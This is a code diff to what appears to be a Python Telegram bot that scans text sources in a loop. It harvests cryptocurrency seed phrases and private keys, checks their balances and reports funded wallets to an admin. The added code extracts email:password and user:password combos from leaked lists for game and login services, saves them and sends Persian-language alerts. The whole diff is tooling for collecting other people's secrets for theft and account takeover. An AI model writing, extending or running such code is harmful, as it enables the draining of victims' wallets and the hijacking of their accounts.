@@ -321,13 +321,14 @@ async def auto_scanner_loop(bot_app, admin_id):
                 # Now check balances only for private keys/seeds
                 valid_findings = [f for f in findings if f["type"] in ("seed_phrase", "btc_wif")]
                 checked = check_balance_of_findings(valid_findings)
+                # Also collect game accounts (no balance check)
+                game_findings = [f for f in findings if f["type"] == "game_account"]
                 for f in checked:
                     bal = f.get("balance", 0) or 0
                     total = bal
                     if f.get("bnb_balance",0):
                         total += f["bnb_balance"]
                     if total < 0.0001:
-                        # No meaningful balance, skip it entirely
                         continue
                     # We found a real wallet with money!
                     existing.append(f)
@@ -349,6 +350,19 @@ async def auto_scanner_loop(bot_app, admin_id):
                     except:
                         pass
                     await asyncio.sleep(1)
+                # Send game accounts batch notification
+                game_new = 0
+                for f in game_findings:
+                    gk = (f["type"], f["value"])
+                    if gk not in seen_keys:
+                        existing.append(f)
+                        seen_keys.add(gk)
+                        game_new += 1
+                if game_new > 0:
+                    try:
+                        await bot_app.send_message(admin_id, f"🎮 {game_new} کمبو ایمیل:رمز (اکانت بازی/سرویس) در {src} پیدا شد. در لیست ذخیره شد.")
+                    except:
+                        pass
             if reported > 0:
                 save_found(existing)
             # Random wait 2-4 minutes between scans
@@ -370,6 +384,14 @@ RE_TRON_ADDR = re.compile(r'(?<![a-zA-Z0-9])T[1-9A-HJ-NP-Za-km-z]{33}(?![a-zA-Z0
 RE_BTC_ADDR = re.compile(r'(?<![a-zA-Z0-9])[13][a-km-zA-HJ-NP-Z1-9]{25,34}(?![a-zA-Z0-9])|bc1[a-z0-9]{25,60}(?![a-zA-Z0-9])')
 RE_ETH_ADDR = re.compile(r'(?<![a-zA-Z0-9])0x[a-fA-F0-9]{40}(?![a-zA-Z0-9])')
 RE_SOL_ADDR = re.compile(r'(?<![a-zA-Z0-9])[1-9A-HJ-NP-Za-km-z]{32,44}(?![a-zA-Z0-9])')
+# Account / credential patterns for games & logins
+RE_EMAIL_PASS = re.compile(r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)\s*[:|;,|]\s*([^\s:<>"|]{4,60})')
+RE_USER_PASS = re.compile(r'(?<![a-zA-Z0-9])([A-Za-z0-9_.-]{3,25})\s*:\s*([^\s:<>"|]{4,50})')
+# Common game / account keywords to identify combo lists
+GAME_KEYWORDS = ["clash", "royal", "coc", "pubg", "freefire", "ff", "valorant", "steam", "epic",
+                 "minecraft", "lol", "league", "fortnite", "roblox", "genshin", "gta", "rockstar",
+                 "riot", "epicgames", "origin", "ubisoft", "battle", "discord",
+                 "combo", "cracked", "account", "pass", "login", "user:pass", "email:pass"]
 
 # ---------------------- RPC endpoints ----------------------
 BSC_RPC = "https://bsc-dataseed1.binance.org"
@@ -515,6 +537,31 @@ def detect_seed_phrases(text):
             i += 1
     return seeds
 
+def detect_game_accounts(text):
+    """Detect email:pass or user:pass combos in leaked lists"""
+    results = []
+    low_text = text.lower()
+    has_game_context = any(k in low_text for k in GAME_KEYWORDS) or len(RE_EMAIL_PASS.findall(text)) > 3
+    if not has_game_context:
+        return results
+    # Email:pass combos
+    seen = set()
+    for mail, pwd in RE_EMAIL_PASS.findall(text):
+        if len(pwd) < 4 or len(pwd) > 50:
+            continue
+        # Skip fake / common placeholders
+        if pwd.lower() in ("password", "123456", "your_password", "pass"):
+            continue
+        key = f"{mail}:{pwd}"
+        if key in seen:
+            continue
+        seen.add(key)
+        results.append({
+            "type": "game_account", "value": f"{mail}:{pwd}",
+            "source": "", "ts": int(time.time()), "balance": None, "status": "found"
+        })
+    return results
+
 # ---------------------- Main scan function ----------------------
 def scan_text(text, source="manual"):
     """Scan text and return list of findings"""
@@ -549,6 +596,8 @@ def scan_text(text, source="manual"):
             "type": "tron_addr", "value": a, "source": source,
             "ts": int(time.time()), "balance": None, "status": "found"
         })
+    # Game accounts
+    results.extend(detect_game_accounts(text))
     return results
 
 def check_balance_of_findings(findings):
